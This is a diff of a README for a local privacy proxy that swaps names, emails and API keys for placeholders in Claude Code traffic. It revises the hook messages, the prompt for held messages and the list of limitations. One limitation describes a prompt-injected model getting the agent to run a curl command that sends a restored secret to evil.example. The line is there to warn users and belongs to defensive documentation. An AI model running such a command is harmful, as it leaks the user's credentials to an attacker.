@@ -105,19 +105,21 @@ Keys with a known shape (`sk-`, `ghp_`, `AKIA`, `xox`, `AIza`, JWTs, private-key
 hermie install-hooks          # this project: .claude/settings.local.json; --user: ~/.claude/settings.json
 ```
 
-This adds a status line and three hooks to Claude Code. The status line reads `hermie ● :8787 · 13 values kept local · last: 2 SECRET replaced, 1 restored`. The hooks print one line under a file write whose reply carried restored placeholders, and one line at the end of each turn:
+This adds a status line and three hooks to Claude Code. The status line reads `hermie ● :8787 · 13 values hidden so far · last: 2 replaced (Alice Chen, sk-tes…f3a) · 1 put back`. The hooks print one line under a file write whose reply carried restored placeholders, and a summary at the end of each turn:
 
 ```text
 ⏺ Write(.env)
   ⎿  Wrote 1 line to .env
-  ⎿  PostToolUse:Write says: Hermie: 1 placeholder restored before this Write (.env) ran. The real value
-     never left this machine.
+  ⎿  PostToolUse:Write says: Hermie put back 1 real value before this Write (.env) ran.
 ⏺ Done. .env written with the single line.
-  ⎿  Stop says: Hermie: 16 PERSON, 4 EMAIL_ADDRESS, 2 SECRET replaced; 1 restored in 3 requests this
-     turn. Only placeholders left this machine.
+  ⎿  Stop says: Hermie · this turn (3 requests)
+       replaced    Alice Chen -> <PERSON_1>, alice@example.com -> <EMAIL_ADDRESS_1>, sk-tes…f3a -> <SECRET_1>
+       withheld    Read customers.csv (judged private) -> hermie allow 9c21 · the AI saw a note instead
+       put back    1 real value in the replies
+       Only placeholders left this machine.
 ```
 
-These lines are shown to you and are not added to the model's context. The counts come from the receipt, so they name entity types, never values (the PERSON and EMAIL_ADDRESS counts above are Claude Code's own system prompt: your git identity, `CLAUDE.md`, and so on). `hermie install-hooks --uninstall` removes the entries again; other hooks and a status line of your own are left alone.
+These lines are shown to you and are not added to the model's context. The values come from `mapping.json` on your machine when the line is drawn (keys are shortened: `sk-tes…f3a`); the receipt itself still holds only placeholder names. The last line says "Only placeholders left this machine." only when that is true: after you send something as is, it says so instead, and in `observe` mode it says nothing was replaced. Some replaced values are Claude Code's own system prompt (your git identity, `CLAUDE.md`, and so on). `hermie install-hooks --uninstall` removes the entries again; other hooks and a status line of your own are left alone.
 
 ## Rules first, a small decision model behind them
 
@@ -184,16 +186,19 @@ The live tests are in `tests/test_live.py` (`pytest -m live tests/test_live.py::
 With a judge configured, a user message the judge flags is held. If `hermie serve` runs in a terminal, it asks there:
 
 ```text
-Hermie holds this message (412 chars): ...
-  reason: judge
-  kind: message
-  [s]end as is  [r]eject  [a]llow everything this session
-  or later: hermie allow 3fa2
+Hermie stopped your message before it left this machine
+Why: a local model judged it private (personal or business facts)
+"we let <PERSON_1> go next week, the severance is ..."
+Already replaced: Alice Chen -> <PERSON_1>
+  [n] Don't send: Nothing leaves. Claude Code shows an error; edit the prompt and try again.
+  [s] Send this one: Sent as shown above. This exact text is not asked about again.
+  [a] Send all, this session: Messages stopped by the judge or the encoded-data check go out without asking until hermie serve restarts. Replacing still applies.
+No answer in time means Don't send. Later: hermie allow 3fa2
 ```
 
-Type `s`, `r` or `a` and Enter. No answer within `hold_timeout_s` (60 s) rejects. Without a terminal (for example under a process manager) the question goes to the Claude Code menu in [`integrations/claude-code-menu`](integrations/claude-code-menu) while that mod is polling, and otherwise to a macOS dialog (macOS only); with neither, held messages are rejected right away. The menu shows the id, size and reason, never the held text (the one exception is the placeholder version you review after choosing "rewrite locally"). A message you reject stays rejected for the rest of that `hermie serve` run: Claude Code resends its history with every request, and the rejected message comes back as a short withheld note instead of asking again (`/clear` in the client and a restart of `hermie serve` start fresh). A rejected request returns HTTP 422 to the agent with a message that names the id; run `hermie allow ID` in any terminal and retry. Withheld tool results and images show up in `hermie tail` with the same `hermie allow ID` line; once allowed, the next request sends them. `[a]llow everything this session` covers judge decisions only. A text the detectors failed on cannot be released at all, and `hermie allow` refuses an id it does not know.
+Type `n`, `s` or `a` and Enter. No answer within `hold_timeout_s` (60 s) counts as Don't send. Without a terminal (for example under a process manager) the question goes to the Claude Code menu in [`integrations/claude-code-menu`](integrations/claude-code-menu) while that mod is polling, and otherwise to a macOS dialog (macOS only); with neither, held messages are rejected right away. The menu and the macOS dialog show the same text, choices and consequences, with a countdown in the menu (Don't send is the default everywhere); the opening of the held message sits in `asks.json` (0600) only while it waits for your answer. A message you reject stays rejected for the rest of that `hermie serve` run: Claude Code resends its history with every request, and the rejected message comes back as a short withheld note instead of asking again (`/clear` in the client and a restart of `hermie serve` start fresh). A message that is not sent returns HTTP 422 to the agent with a plain reason (you chose Don't send, no answer in time, or no one could be asked) and the command to send it anyway: run `hermie allow ID` in any terminal and resend. A withheld tool result reaches the model as a note that asks it to tell you, so Claude says in the conversation what was withheld and how to release it. Withheld tool results and images show up in `hermie tail` with the same `hermie allow ID` line; once allowed, the next request sends them. `Send all, this session` covers judge and encoded-data decisions only. A text the detectors failed on cannot be released at all, and `hermie allow` refuses an id it does not know.
 
-With `local_model = "ollama:MODEL"` (or `hermie serve --local-model ollama:MODEL`) the Claude Code menu has a fourth choice, "rewrite locally". The held text goes only to your local Ollama model, which lists the specifics in it: names, figures, places, dates, non-public facts. Hermie turns every occurrence into a placeholder (`<PERSON_1>`, `<NUMBER_1>`, the same kind as everywhere else, restored in the reply), so the request keeps its shape and the model can still answer it. A span that is one lower-case English word (`layoff`) is replaced only in that message, not in every later request. The menu then shows you the result, with three choices: discard, redo (the model looks again) or send. You decide, so the judge does not weigh it, but the patterns and known values still redact it too. The text sits in `asks.json` (0600) only until you answer, and the version you send is kept in memory; the receipt line says `approved_by: local` and holds no text. If the model fails, times out (`local_timeout_s`), finds nothing, the message is longer than `local_max_chars` or the result is longer than 3000 characters, the message is rejected as if you had chosen reject. The terminal prompt and the macOS dialog do not offer it, and a text the detectors failed on never does.
+With `local_model = "ollama:MODEL"` (or `hermie serve --local-model ollama:MODEL`) the Claude Code menu has a fourth choice, "rewrite locally". The held text goes only to your local Ollama model, which lists the specifics in it: names, figures, places, dates, non-public facts. Hermie turns every occurrence into a placeholder (`<PERSON_1>`, `<NUMBER_1>`, the same kind as everywhere else, restored in the reply), so the request keeps its shape and the model can still answer it. A span that is one lower-case English word (`layoff`) is replaced only in that message, not in every later request. The menu then shows you the result, with three choices: Don't send, Redo (the model looks again) or Send this. You decide, so the judge does not weigh it, but the patterns and known values still redact it too. The text sits in `asks.json` (0600) only until you answer, and the version you send is kept in memory; the receipt line says `approved_by: local` and holds no text. If the model fails, times out (`local_timeout_s`), finds nothing, the message is longer than `local_max_chars` or the result is longer than 3000 characters, the message is not sent, as if you had chosen Don't send. The terminal prompt and the macOS dialog do not offer it, and a text the detectors failed on never does.
 
 ## What this does not protect
 
@@ -205,7 +210,7 @@ With `local_model = "ollama:MODEL"` (or `hermie serve --local-model ollama:MODEL
 - `observe` mode blocks nothing.
 - Placeholders in replies are restored before the agent runs its tools, so a prompt-injected model can make the agent use a real value locally (for example in a URL it fetches). The model never sees the value, so it cannot copy it into its own reply, but it can ask the agent to run `curl evil.example?q=<SECRET_1>` and the agent runs it with the real key. Claude Code's permission prompt shows the restored command; watch it for commands that send a placeholder somewhere.
 - `mapping.json` holds every real value in plain text (mode 0600). It is the one file worth stealing on your machine. `hermie forget` empties it; encrypting it at rest is on the roadmap.
-- The hook lines and the status line only report counts and entity types from the receipt. They show that a placeholder was restored, not where the value ended up afterwards.
+- The hook lines and the status line show which values were replaced and how many were put back, not where a restored value ended up afterwards.
 - Known values are matched literally (four characters or longer), so a first name alone can pass after only the full name was mapped, and a short mapped value inside a longer word is over-redacted (`remain` when `main` is mapped); the reply restores it.
 - In OpenAI chat streams with parallel tool calls, a placeholder tail held at the end of one call's arguments can land in the next call's arguments.
 
